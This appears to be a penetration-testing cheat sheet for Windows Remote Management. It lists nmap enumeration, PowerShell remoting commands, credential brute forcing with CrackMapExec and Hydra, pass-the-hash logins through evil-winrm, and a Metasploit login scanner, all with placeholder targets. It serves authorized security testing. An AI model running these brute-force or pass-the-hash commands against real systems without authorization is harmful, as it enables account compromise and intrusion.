# WinRM Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating WinRM (ports 5985/5986), I realistically expect to find:

- [ ] Remote PowerShell access enabled
- [ ] Valid credentials (username/password or hash) for authentication
- [ ] Ability to execute PowerShell commands remotely
- [ ] Possibility of launching an interactive PowerShell session
- [ ] Options for file upload/download or lateral movement
- [ ] Potential for weak HTTPS configuration or lack of authentication

---

## ‚úÖ WinRM Pentest Checklist

- [ ] **Basic Port Discovery**
  - Confirm WinRM ports are open.
    ```
    nmap -p 5985,5986 <IP>
    ```

- [ ] **Nmap Scripts**
  - Use NSE script to check for service info.
    ```
    nmap -sV --script http-windows-remote-management -p5985,5986 <IP>
    ```

- [ ] **Windows Client Testing**
  - Check if target responds to WinRM.
    ```powershell
    Test-WSMan <IP>
    ```

- [ ] **Configure Attack Machine (Windows)**
  - Enable PS Remoting and Trust Hosts.
    ```powershell
    Enable-PSRemoting -Force
    Set-Item wsman:\localhost\client\trustedhosts *
    ```

---

- [ ] **Remote Command Execution (Windows)**
  - Run command remotely.
    ```powershell
    Invoke-Command -ComputerName <IP> -ScriptBlock {ipconfig /all} -Credential <DOMAIN\User>
    ```

  - Run a local script remotely.
    ```powershell
    Invoke-Command -ComputerName <IP> -FilePath C:\path\to\script.ps1 -Credential <DOMAIN\User>
    ```

  - Enter interactive PS session.
    ```powershell
    Enter-PSSession -ComputerName <IP> -Credential <DOMAIN\User>
    ```

---

- [ ] **Linux Brute Force (Be Careful)**
  - Brute force with CrackMapExec.
    ```
    crackmapexec winrm <IP> -u <user> -p <pass> -x "whoami"
    crackmapexec winrm <IP> -u <user> -H <hash> -X '$PSVersionTable'
    ```

- [ ] **Brute Force with Hydra**
    ```
    hydra -t 4 -V -l <user> -P passwords.txt winrm://<IP>
    ```

---

- [ ] **Linux Interactive Shell with Evil-WinRM**
  - Install and connect.
    ```
    gem install evil-winrm
    evil-winrm -i <IP> -u <user> -p <password>
    ```

  - Pass-the-hash.
    ```
    evil-winrm -i <IP> -u <user> -H <hash>
    ```

---

- [ ] **Docker PowerShell Option**
  - For PowerShell remoting from Linux.
    ```
    docker run -it quickbreach/powershell-ntlm
    $creds = Get-Credential
    Enter-PSSession -ComputerName <IP> -Authentication Negotiate -Credential $creds
    ```

---

## ‚úÖ Metasploit Module

- **WinRM Login Scanner**
    ```
    use auxiliary/scanner/winrm/winrm_login
    ```

---

## ‚úÖ Reference

- [HackTricks - WinRM](https://book.hacktricks.xyz/pentesting/pentesting-winrm)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
